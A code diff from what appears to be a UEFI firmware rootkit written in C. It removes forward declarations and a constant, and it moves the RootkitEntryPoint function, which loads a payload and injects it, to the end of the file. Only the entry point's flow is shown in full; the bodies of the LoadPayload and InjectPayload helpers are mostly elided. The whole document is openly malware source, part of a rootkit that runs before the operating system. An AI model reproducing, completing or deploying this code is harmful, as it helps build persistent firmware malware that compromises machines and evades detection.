@@ -13,31 +13,6 @@
 
 extern EFI_GUID gEfiPayloadGuid;
 
-const UINTN page_size = 4000;
-
-EFI_STATUS LoadPayload(IN EFI_HANDLE image_handle, OUT void **buffer, OUT UINTN *size);
-EFI_STATUS InjectPayload(IN EFI_HANDLE image_handle, IN void *buffer, IN UINTN size);
-
-EFI_STATUS EFIAPI RootkitEntryPoint(IN EFI_HANDLE image_handle, IN EFI_SYSTEM_TABLE *system_table)
-{
-    UINTN payload_size;
-    void *payload;
-    EFI_STATUS status = LoadPayload(image_handle, &payload, &payload_size);
-    if (EFI_ERROR(status))
-    {
-        Print(L"LoadPayload failed.\n");
-        return status;
-    }
-
-    status = InjectPayload(image_handle, payload, payload_size);
-    if (EFI_ERROR(status))
-    {
-        Print(L"InjectPayload failed.\n");
-    }
-
-    return status;
-}
-
 EFI_STATUS LoadPayload(IN EFI_HANDLE image_handle, OUT void **buffer, OUT UINTN *size)
 {
     UINTN handles_size;
@@ -163,4 +138,24 @@ EFI_STATUS InjectPayload(IN EFI_HANDLE image_handle, IN void *buffer, IN UINTN s
     }
 
     return return_value;
+}
+
+EFI_STATUS EFIAPI RootkitEntryPoint(IN EFI_HANDLE image_handle, IN EFI_SYSTEM_TABLE *system_table)
+{
+    UINTN payload_size;
+    void *payload;
+    EFI_STATUS status = LoadPayload(image_handle, &payload, &payload_size);
+    if (EFI_ERROR(status))
+    {
+        Print(L"LoadPayload failed.\n");
+        return status;
+    }
+
+    status = InjectPayload(image_handle, payload, payload_size);
+    if (EFI_ERROR(status))
+    {
+        Print(L"InjectPayload failed.\n");
+    }
+
+    return status;
 }
